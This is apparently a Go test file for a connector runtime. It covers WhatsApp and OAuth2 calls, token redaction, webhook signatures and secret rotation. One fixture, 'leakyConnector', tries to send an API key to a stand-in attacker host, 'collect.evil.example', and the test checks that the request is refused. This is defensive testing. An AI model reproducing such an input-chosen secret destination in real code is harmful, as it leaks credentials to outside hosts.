package server

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rangka-os/rangka-os/kernel/internal/engine"
)

// Contract 0002 §A and 0017 §5–§7: the connector runtime. The vendor is a fake transport, so the kernel's own host
// checks run on the real URLs (graph.facebook.com) without a network.

type vendor struct {
	mu     sync.Mutex
	reqs   []*http.Request
	bodies []string
	status int
	answer string
}

func (v *vendor) RoundTrip(r *http.Request) (*http.Response, error) {
	v.mu.Lock()
	defer v.mu.Unlock()
	var b []byte
	if r.Body != nil {
		b, _ = io.ReadAll(r.Body)
	}
	v.reqs = append(v.reqs, r)
	v.bodies = append(v.bodies, string(b))
	return &http.Response{StatusCode: v.status, Header: http.Header{"Content-Type": {"application/json"}},
		Body: io.NopCloser(strings.NewReader(v.answer)), Request: r}, nil
}

const leakyConnector = `# yaml-language-server: $schema=https://rangka-os.github.io/rangka-os/schema/0.5/connector.json
name: leaky_test
label: {id: Leaky test}
summary: {id: Penghubung uji yang mencoba mengirim kunci ke host lain.}
version: 1.0.0
hosts: [api.example.com]
auth:
  type: token
  fields:
    - {name: api_key, label: {id: API key}, secret: true}
actions:
  - name: elsewhere
    request:
      method: GET
      url: https://{input.host}/v1/balance
      headers: {Authorization: 'Bearer {auth.api_key}'}
    input:
      - {name: host, type: data, required: true}
`

func runtimeEnv(t *testing.T) (*env, *vendor) {
	t.Helper()
	t.Setenv("RANGKA_MASTER_KEY", testKEK(t))
	t.Setenv("RANGKA_MASTER_KEY_FILE", "")
	e := newEnv(t, false, func(apps, site string) {
		p := filepath.Join(site, "system.rk")
		b, _ := os.ReadFile(p)
		os.WriteFile(p, []byte(strings.Replace(string(b), "secrets: {driver: env}", "secrets: {driver: db}", 1)), 0o644)
		dir := filepath.Join(filepath.Dir(apps), "rangka-connectors", "leaky_test")
		os.MkdirAll(dir, 0o755)
		if err := os.WriteFile(filepath.Join(dir, "connector.rk"), []byte(leakyConnector), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	v := &vendor{status: 200, answer: `{"messages":[{"id":"wamid.1"}]}`}
	e.s.Connectors.HTTP = &http.Client{Transport: v, Timeout: 5 * time.Second}
	e.login()
	for f, val := range map[string]string{"access_token": waToken, "app_secret": waSecret, "verify_token": waVerify, "phone_number_id": "1098765432"} {
		e.must(204, "PUT", "/api/v1/connectors/whatsapp_business/auth/"+f, map[string]any{"value": val})
	}
	e.must(204, "PUT", "/api/v1/connectors/leaky_test/auth/api_key", map[string]any{"value": "leaky-api-key-0017-zzzz"})
	return e, v
}

// waitJob waits for a job to finish and returns its state and errors text.
func waitJob(t *testing.T, e *env, id int64) (string, string) {
	t.Helper()
	for i := 0; i < 200; i++ {
		res, err := e.s.DB.Query(context.Background(), "select state, errors::text from rk_jobs where id = $1", id)
		if err != nil {
			t.Fatal(err)
		}
		if st := res.Rows[0][0].(string); st == "completed" || st == "discarded" {
			return st, res.Rows[0][1].(string)
		}
		time.Sleep(25 * time.Millisecond)
	}
	t.Fatalf("job %d did not finish", id)
	return "", ""
}

func callJob(t *testing.T, e *env, connector, action string, input map[string]any) int64 {
	t.Helper()
	id, err := e.s.Queue.Enqueue(context.Background(), nil, "call", "kopi-senja", map[string]any{"connector": connector, "action": action, "input": input},
		engine.EnqueueOpts{MaxAttempts: 1})
	if err != nil {
		t.Fatal(err)
	}
	return id
}

func dump(t *testing.T, e *env, q string) string {
	t.Helper()
	res, err := e.s.DB.Query(context.Background(), q)
	if err != nil {
		t.Fatal(err)
	}
	var b strings.Builder
	for _, r := range res.Rows {
		for _, c := range r {
			b.WriteString(toText(c))
			b.WriteByte(' ')
		}
	}
	return b.String()
}

func toText(v any) string {
	switch t := v.(type) {
	case string:
		return t
	case []byte:
		return string(t)
	case nil:
		return ""
	}
	b, _ := json.Marshal(v)
	return string(b)
}

// An outbound call renders the token into the header at send time; a vendor error that echoes the token is stored
// scrubbed everywhere (audit, job errors); the job holds no rendered request.
func TestConnectorCallScrubsEchoedToken(t *testing.T) {
	e, v := runtimeEnv(t)
	// success: Bearer token sent to graph.facebook.com, output mapped, call audited
	id := callJob(t, e, "whatsapp_business", "send_template", map[string]any{"to": "6281234", "template": "halo", "idempotency_key": "k1"})
	if st, errs := waitJob(t, e, id); st != "completed" {
		t.Fatalf("call: %s %s", st, errs)
	}
	if len(v.reqs) != 1 || v.reqs[0].URL.Host != "graph.facebook.com" || v.reqs[0].Header.Get("Authorization") != "Bearer "+waToken ||
		!strings.Contains(v.reqs[0].URL.Path, "/1098765432/messages") || !strings.Contains(v.bodies[0], `"to":"6281234"`) {
		t.Fatalf("request: %v %v %s", v.reqs[0].URL, v.reqs[0].Header, v.bodies[0])
	}
	// failure: Meta echoes the token in its error; 400 is not retried → dead letter at once
	v.status, v.answer = 400, `{"error":{"message":"Invalid OAuth access token - Cannot parse access token `+waToken+`"}}`
	id = callJob(t, e, "whatsapp_business", "send_template", map[string]any{"to": "6281234", "template": "halo", "idempotency_key": "k2"})
	st, errs := waitJob(t, e, id)
	if st != "discarded" || !strings.Contains(errs, "[redacted:access_token]") {
		t.Fatalf("failed call: %s %s", st, errs)
	}
	all := dump(t, e, "select args::text, coalesce(errors::text, ''), coalesce(result::text, '') from rk_jobs") +
		dump(t, e, "select kind, summary, coalesce(data::text, '') from rk_audit")
	noLeak(t, "jobs and audit", []byte(all), waToken, waSecret)
	if !strings.Contains(all, "connector.error") || !strings.Contains(all, "connector.call") {
		t.Fatalf("audit kinds missing: %s", all)
	}
	// /system/status counts the call and the error
	st0 := e.must(200, "GET", "/api/v1/system/status", nil)
	noLeak(t, "status", st0.Body, waToken)
}

// A connector forced to send its secret to a host outside hosts: is refused at send time; nothing is sent.
func TestConnectorHostRefused(t *testing.T) {
	e, v := runtimeEnv(t)
	id := callJob(t, e, "leaky_test", "elsewhere", map[string]any{"host": "collect.evil.example"})
	st, errs := waitJob(t, e, id)
	if st != "discarded" || !strings.Contains(errs, "secret_host_refused") {
		t.Fatalf("leaky call: %s %s", st, errs)
	}
	if len(v.reqs) != 0 {
		t.Fatalf("a request was sent: %v", v.reqs[0].URL)
	}
	noLeak(t, "jobs", []byte(dump(t, e, "select coalesce(errors::text, '') from rk_jobs")), "leaky-api-key-0017-zzzz")
}

// Without its keys a call fails with connector_needs_auth, without retries.
func TestConnectorNeedsAuth(t *testing.T) {
	e, _ := runtimeEnv(t)
	e.must(204, "DELETE", "/api/v1/connectors/whatsapp_business/auth/access_token", nil)
	id, err := e.s.Queue.Enqueue(context.Background(), nil, "call", "kopi-senja", map[string]any{"connector": "whatsapp_business", "action": "send_template",
		"input": map[string]any{"to": "1", "template": "x"}}, engine.EnqueueOpts{MaxAttempts: 5})
	if err != nil {
		t.Fatal(err)
	}
	st, errs := waitJob(t, e, id)
	if st != "discarded" || !strings.Contains(errs, "connector_needs_auth") || strings.Count(errs, `"attempt"`) != 1 {
		t.Fatalf("needs auth: %s %s", st, errs)
	}
}

func signed(body []byte, key string) string {
	m := hmac.New(sha256.New, []byte(key))
	m.Write(body)
	return "sha256=" + hex.EncodeToString(m.Sum(nil))
}

const waMessage = `{"object":"whatsapp_business_account","entry":[{"id":"1","changes":[{"field":"messages","value":{
"messaging_product":"whatsapp","contacts":[{"profile":{"name":"Bu Sari"},"wa_id":"6281299990001"}],
"messages":[{"from":"6281299990001","id":"wamid.HBg1","timestamp":"1762650000","type":"text","text":{"body":"Halo, mau pesan kopi untuk kantor"}}]}}]}]}`

func hook(t *testing.T, e *env, path string, body []byte, sig string) *http.Response {
	t.Helper()
	req, _ := http.NewRequest("POST", e.ts.URL+path, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	if sig != "" {
		req.Header.Set("X-Hub-Signature-256", sig)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	return resp
}

func leadsByPhone(t *testing.T, e *env, phone string) int {
	t.Helper()
	n := 0
	for _, r := range rowsOf(e.must(200, "GET", "/api/v1/r/lead?limit=500", nil)) {
		if get(r, "phone") == phone {
			n++
		}
	}
	return n
}

// A signed WhatsApp message makes one lead through whatsapp_to_lead; the same webhook again creates nothing; a
// wrong or missing signature is 401 and creates nothing; the old app secret still verifies during a rotation.
func TestWebhookToLead(t *testing.T) {
	e, _ := runtimeEnv(t)
	const path = "/hooks/kopi-senja/whatsapp_business/message_received"
	body := []byte(waMessage)
	if r := hook(t, e, path, body, ""); r.StatusCode != 401 {
		t.Fatalf("no signature: %d", r.StatusCode)
	}
	if r := hook(t, e, path, body, signed(body, "wrong-secret")); r.StatusCode != 401 {
		t.Fatalf("wrong signature: %d", r.StatusCode)
	}
	if r := hook(t, e, path, body, signed(body, waSecret)); r.StatusCode != 200 {
		t.Fatalf("signed: %d", r.StatusCode)
	}
	waitLeads := func(want int) {
		t.Helper()
		for i := 0; i < 200 && leadsByPhone(t, e, "6281299990001") < want; i++ {
			time.Sleep(25 * time.Millisecond)
		}
	}
	waitLeads(1)
	if n := leadsByPhone(t, e, "6281299990001"); n != 1 {
		t.Fatalf("leads after the webhook = %d", n)
	}
	// a vendor retry of the same delivery: nothing new
	if r := hook(t, e, path, body, signed(body, waSecret)); r.StatusCode != 200 {
		t.Fatalf("duplicate: %d", r.StatusCode)
	}
	time.Sleep(300 * time.Millisecond)
	if n := leadsByPhone(t, e, "6281299990001"); n != 1 {
		t.Fatalf("leads after a duplicate = %d", n)
	}
	// rotation: the previous app secret still verifies until retire_at
	e.must(204, "PUT", "/api/v1/connectors/whatsapp_business/auth/app_secret", map[string]any{"value": waSecret + "-new"})
	other := []byte(strings.Replace(waMessage, "wamid.HBg1", "wamid.HBg2", 1))
	if r := hook(t, e, path, other, signed(other, waSecret)); r.StatusCode != 200 {
		t.Fatalf("old secret during rotation: %d", r.StatusCode)
	}
	// the default-org path serves the site's org
	third := []byte(strings.Replace(waMessage, "wamid.HBg1", "wamid.HBg3", 1))
	if r := hook(t, e, "/hooks/whatsapp_business/message_received", third, signed(third, waSecret+"-new")); r.StatusCode != 200 {
		t.Fatalf("default org path: %d", r.StatusCode)
	}
	if r := hook(t, e, "/hooks/nope-org/whatsapp_business/message_received", third, signed(third, waSecret+"-new")); r.StatusCode != 404 {
		t.Fatalf("unknown org: %d", r.StatusCode)
	}
	noLeak(t, "audit", []byte(dump(t, e, "select summary, coalesce(data::text, '') from rk_audit")), waSecret, waToken)
}

// Meta's subscription check: GET with hub.verify_token echoes hub.challenge only for the right token.
func TestWebhookChallenge(t *testing.T) {
	e, _ := runtimeEnv(t)
	get := func(tok string) (int, string) {
		resp, err := http.Get(e.ts.URL + "/hooks/kopi-senja/whatsapp_business/message_received?hub.mode=subscribe&hub.challenge=12345&hub.verify_token=" + tok)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}
	if st, b := get(waVerify); st != 200 || b != "12345" {
		t.Fatalf("right token: %d %q", st, b)
	}
	if st, _ := get("wrong"); st != 401 {
		t.Fatalf("wrong token: %d", st)
	}
}

const oauthConnector = `# yaml-language-server: $schema=https://rangka-os.github.io/rangka-os/schema/0.5/connector.json
name: oauth_test
label: {id: OAuth test}
summary: {id: Penghubung uji dengan OAuth2.}
version: 1.0.0
hosts: [api.example.com, auth.example.com]
auth:
  type: oauth2
  token_url: https://auth.example.com/token
  fields:
    - {name: client_id, label: {id: Client ID}}
    - {name: client_secret, label: {id: Client secret}, secret: true}
    - {name: refresh_token, label: {id: Refresh token}, secret: true}
    - {name: access_token, label: {id: Access token}, secret: true, required: false}
    - {name: expires_at, label: {id: Expires at}, required: false}
actions:
  - name: me
    request:
      method: GET
      url: https://api.example.com/v1/me
`

type oauthVendor struct {
	mu        sync.Mutex
	refreshes int
	fail      bool
	apiAuth   []string
}

func (v *oauthVendor) RoundTrip(r *http.Request) (*http.Response, error) {
	v.mu.Lock()
	defer v.mu.Unlock()
	answer, status := `{"id":"me"}`, 200
	if r.URL.Host == "auth.example.com" {
		b, _ := io.ReadAll(r.Body)
		v.refreshes++
		if v.fail || !strings.Contains(string(b), "refresh_token=rt-0017-old-refresh-token") && !strings.Contains(string(b), "refresh_token=rt-0017-new-refresh-token") {
			answer, status = `{"error":"invalid_grant","detail":"`+string(b)+`"}`, 400
		} else {
			answer = `{"access_token":"at-0017-fresh-access-token-` + itoa(v.refreshes) + `","refresh_token":"rt-0017-new-refresh-token","expires_in":3600}`
		}
	} else {
		v.apiAuth = append(v.apiAuth, r.Header.Get("Authorization"))
	}
	return &http.Response{StatusCode: status, Header: http.Header{"Content-Type": {"application/json"}}, Body: io.NopCloser(strings.NewReader(answer)), Request: r}, nil
}

// OAuth2 (§8): an expired access token is refreshed at token_url before the call and stored as a new version; a
// failed refresh drops the access token (needs_auth) and is audited, and the refresh token never shows up.
func TestOAuth2Refresh(t *testing.T) {
	t.Setenv("RANGKA_MASTER_KEY", testKEK(t))
	t.Setenv("RANGKA_MASTER_KEY_FILE", "")
	e := newEnv(t, false, func(apps, site string) {
		p := filepath.Join(site, "system.rk")
		b, _ := os.ReadFile(p)
		os.WriteFile(p, []byte(strings.Replace(string(b), "secrets: {driver: env}", "secrets: {driver: db}", 1)), 0o644)
		dir := filepath.Join(filepath.Dir(apps), "rangka-connectors", "oauth_test")
		os.MkdirAll(dir, 0o755)
		os.WriteFile(filepath.Join(dir, "connector.rk"), []byte(oauthConnector), 0o644)
	})
	v := &oauthVendor{}
	e.s.Connectors.HTTP = &http.Client{Transport: v}
	e.login()
	const path = "/api/v1/connectors/oauth_test/auth/"
	e.must(204, "PUT", path+"client_id", map[string]any{"value": "client-1"})
	e.must(204, "PUT", path+"client_secret", map[string]any{"value": "cs-0017-client-secret-value"})
	e.must(204, "PUT", path+"refresh_token", map[string]any{"value": "rt-0017-old-refresh-token"})
	e.must(204, "PUT", path+"access_token", map[string]any{"value": "at-0017-stale-access-token"})
	e.must(204, "PUT", path+"expires_at", map[string]any{"value": "2020-01-01T00:00:00Z"})

	if st, errs := waitJob(t, e, callJob(t, e, "oauth_test", "me", nil)); st != "completed" {
		t.Fatalf("call: %s %s", st, errs)
	}
	if v.refreshes != 1 || len(v.apiAuth) != 1 || v.apiAuth[0] != "Bearer at-0017-fresh-access-token-1" {
		t.Fatalf("refresh %d, api auth %v", v.refreshes, v.apiAuth)
	}
	// the new expiry is an hour out: the next call does not refresh
	if st, _ := waitJob(t, e, callJob(t, e, "oauth_test", "me", nil)); st != "completed" || v.refreshes != 1 {
		t.Fatalf("second call refreshed again: %d", v.refreshes)
	}
	// a refused refresh: access token dropped, connector needs auth, audited; nothing leaks
	e.must(204, "PUT", path+"expires_at", map[string]any{"value": "2020-01-01T00:00:00Z"})
	v.fail = true
	st, errs := waitJob(t, e, callJob(t, e, "oauth_test", "me", nil))
	if st != "discarded" || !strings.Contains(errs, "connector_needs_auth") {
		t.Fatalf("failed refresh: %s %s", st, errs)
	}
	if f := authField(t, e.must(200, "GET", "/api/v1/connectors/oauth_test/auth", nil), "access_token"); f["set"] != false {
		t.Fatalf("access token after a failed refresh: %v", f)
	}
	all := dump(t, e, "select kind, summary, coalesce(data::text, '') from rk_audit") + dump(t, e, "select coalesce(errors::text, '') from rk_jobs")
	if !strings.Contains(all, "connector.needs_auth") {
		t.Fatal("no connector.needs_auth audit entry")
	}
	noLeak(t, "audit and jobs", []byte(all), "rt-0017-new-refresh-token", "rt-0017-old-refresh-token", "cs-0017-client-secret-value", "at-0017-fresh-access-token-1")
}

// A flow's call: step queues a call job (input, never a rendered request) that the runtime sends.
func TestFlowCallQueuesJob(t *testing.T) {
	e, v := runtimeEnv(t)
	flow := "# yaml-language-server: $schema=https://rangka-os.github.io/rangka-os/schema/0.5/flow.json\n" +
		"name: kirim_halo\nlabel: {id: Kirim halo}\nsteps:\n" +
		"  - call: whatsapp_business.send_template\n    with: {to: \"'6281234'\", template: \"'halo'\"}\n    as: sent\n"
	if err := os.WriteFile(filepath.Join(e.apps, "crm", "flows", "kirim_halo.rk"), []byte(flow), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := e.s.Reload(context.Background()); err != nil {
		t.Fatal(err)
	}
	res := e.must(200, "POST", "/api/v1/flows/kirim_halo/run", map[string]any{})
	if !strings.Contains(string(res.Body), "queued") {
		t.Fatalf("flow: %s", res.Body)
	}
	for i := 0; i < 200 && len(v.reqs) == 0; i++ {
		time.Sleep(25 * time.Millisecond)
	}
	if len(v.reqs) != 1 || v.reqs[0].Header.Get("Authorization") != "Bearer "+waToken {
		t.Fatalf("vendor requests: %d", len(v.reqs))
	}
	noLeak(t, "jobs", []byte(dump(t, e, "select args::text from rk_jobs where kind = 'call'")), waToken)
}
